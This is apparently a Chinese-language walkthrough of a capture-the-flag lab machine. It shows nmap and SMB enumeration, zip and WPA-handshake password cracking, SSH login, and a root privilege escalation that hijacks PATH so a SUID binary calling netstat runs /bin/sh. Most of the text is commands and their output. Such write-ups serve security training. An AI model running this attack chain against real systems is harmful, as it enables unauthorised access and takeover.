```
nmap -sP 192.168.0.0/24
```

```
nmap -sV -sC 192.168.0.102 
```

```
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.000075s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)
|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)
|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)
MAC Address: 00:0C:29:7A:1A:0D (VMware)
Service Info: Host: NITIN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m01s, deviation: 3h10m31s, median: -1s
|_nbstat: NetBIOS name: NITIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nitin
|   NetBIOS computer name: NITIN\x00
|   Domain name: 168.1.7
|   FQDN: nitin.168.1.7
|_  System time: 2022-11-23T10:00:51+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-23T04:30:51
|_  start_date: N/A

```

扫80端口下网站目录

```
gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

检测smb

```
nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.0.102
```

 smbmap 列出共享

```
smbmap -H 192.168.0.102
```

enum4linux 测试 smb 安全，可以匿名登录 同时发现存在 smb 用户

```
enum4linux -U 192.168.0.102
```

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Nov 22 23:41:08 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.102
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.0.102    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ====================================== 
|    Session Check on 192.168.0.102    |
 ====================================== 
[+] Server 192.168.0.102 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.0.102    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ============================== 
|    Users on 192.168.0.102    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smb      Name:   Desc: 

user:[smb] rid:[0x3e8]
enum4linux complete on Tue Nov 22 23:41:08 2022
```

enum4linux 192.168.0.102 ，这条命令 全方位测试 smb 服务安全 枚举用

```
enum4linux 192.168.0.102
```

```
+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sagar (Local User)
S-1-22-1-1001 Unix User\blackjax (Local User)
S-1-22-1-1002 Unix User\smb (Local User)
```

用 smbmap 列出用户共享目录 smbmap -H 192.168.0.102 -u  smb

```
smbmap -H 192.168.0.102 -u smb
```

smbclient 访问目录

```
smbclient //192.168.0.102/smb -U smb
```

```
smbclient //192.168.0.102/smb -U smb                               130 ⨯
Enter WORKGROUP\smb's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov  4 06:50:37 2019
  ..                                  D        0  Mon Nov  4 06:37:28 2019
  main.txt                            N       10  Mon Nov  4 06:45:38 2019
  safe.zip                            N  3424907  Mon Nov  4 06:50:37 2019

                9204224 blocks of size 1024. 6889244 blocks available

```

get main.txt safe.zip 通过 get 命令下载这两个文件

```
get main.txt
```

```
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> mget main.txt
Get file main.txt? y
getting file \main.txt of size 10 as main.txt (4.9 KiloBytes/sec) (average 81577.0 KiloBytes/sec)
```

fcrackzip 破解 zip 文件

fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip

此时得知本safe.zip的密码为hacker1(我把/usr/share/wordlists/rockyou.txt 复制到root目录下了)

```
fcrackzip -D -p rockyou.txt -u safe.zip
PASSWORD FOUND!!!!: pw == hacker1
```

解压safe.zip

```
unzip safe.zip
```

```
Archive:  safe.zip
[safe.zip] secret.jpg password: 
  inflating: secret.jpg              
  inflating: user.cap
```

破解user.cap

```
aircrack-ng -w rockyou.txt user.cap
```

```
 Reading packets, please wait...
Opening user.cap
Read 49683 packets.

   #  BSSID              ESSID                     Encryption

   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening user.cap
Read 49683 packets.

1 potential targets


                               Aircrack-ng 1.6 

      [00:00:01] 1479/10303727 keys tested (2617.58 k/s) 

      Time left: 1 hour, 5 minutes, 35 seconds                   0.01%

                           KEY FOUND! [ snowflake ]


      Master Key     : 88 D4 8C 29 79 BF DF 88 B4 14 0F 5A F3 E8 FB FB 
                       59 95 91 7F ED 3E 93 DB 2A C9 BA FB EE 07 EA 62 

      Transient Key  : BA 24 7C 42 0F D4 90 00 5D E2 16 CF B2 C8 E5 2C 
                       B9 27 97 B0 62 A5 37 22 AE EF F2 8E 46 20 60 60 
                       38 D4 D0 12 B3 92 37 77 CB 78 B4 E3 A6 6E E2 36 
                       80 C9 97 EE 9A 7E 3F B8 45 1F 89 42 F4 88 E9 00 

      EAPOL HMAC     : ED B5 F7 D9 56 98 B0 5E 25 7D 86 08 C4 D4 02 3D 
```

得到:     blackjax/snowflake

#### 使用ssh登录:

注意此时ssh端口为2525

```
ssh -p 2525 blackjax@192.168.0.102
```

```
$ cat user.txt
  _    _  _____ ______ _____        ______ _               _____ 
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __ 
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|
                                                                 
                                                                 

Go To Root.

MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
```

#### 提权：

还是找找suid文件

```
find / -type f -perm -u=s 2>/dev/null
```

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/netscan
/usr/bin/sudo
/bin/ping6
/bin/fusermount
/bin/mount
/bin/su
/bin/ping
/bin/umount
/bin/ntfs-3g
```

```
$ /usr/bin/netscan
```

```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:2525            0.0.0.0:*               LISTEN      1137/sshd       
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1008/smbd       
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1138/mysqld     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1008/smbd       
tcp        0     36 192.168.0.102:2525      192.168.0.103:53918     ESTABLISHED 1792/sshd: blackjax
tcp        0      0 192.168.0.102:445       192.168.0.103:42636     ESTABLISHED 1789/smbd       
tcp6       0      0 :::2525                 :::*                    LISTEN      1137/sshd       
tcp6       0      0 :::445                  :::*                    LISTEN      1008/smbd       
tcp6       0      0 :::139                  :::*                    LISTEN      1008/smbd       
tcp6       0      0 :::80                   :::*                    LISTEN      1262/apache2
```

发现其调用netstat命令

```
$ xxd /usr/bin/netscan
00000530: 6e65 7473 7461 7420 2d61 6e74 7000 0000  netstat -antp...
```

创建文件 netstat 

```
cd /tmp 
echo "/bin/sh" >netstat 
chmod 775 netstat
```

设置环境变量 PATH

```
echo $PATH
```

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
export PATH=/tmp:$PATH
```

```
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ netscan
```

<img src=".\图片\Snipaste_2022-11-23_14-00-02.png" alt="Snipaste_2022-11-23_14-00-02" style="zoom:80%;" />

### 总结：

一些smb服务的利用姿势，一些工具的简单使用，smbmap、enum4linux、smbclient，smb服务可能直接匿名进入，然后可以获得一些功能，比如：查看当前文件，下载等。

fcrackzip、aircrack-ng可尝试破解.zip和.cap文件。

得到敏感文件时要提取重要信息

环境变量提权，已知/usr/bin/netscan发现其调用netstat命令，直接创建netstat文件写入/bin/sh，再把当前目录tmp设置到环境变量中，在当前目录调用netscan时会调用/tmp下的netstat文件从而执行/bin/sh。哦哦，前提条件是/usr/bin/netscan命令具有root的suid权限，这个我们首先通过第一步find / -type f -perm -u=s 2>/dev/null便找到了